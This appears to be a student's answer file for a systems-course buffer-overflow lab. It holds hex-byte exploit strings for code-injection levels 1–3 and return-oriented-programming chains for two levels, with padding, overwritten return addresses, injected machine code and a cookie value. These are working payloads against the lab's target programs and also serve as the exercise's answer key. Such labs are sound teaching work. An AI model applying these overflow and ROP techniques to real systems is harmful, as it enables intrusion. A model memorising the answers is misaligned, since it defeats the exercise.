Part I: Code Injection Attacks

level1:

input:

61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
c0 17 40

level2

48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
78 dc 61 55

level3

48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
00

Part II: Return-Oriented Programming

level2

61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00

level3

61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
20 1a 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
00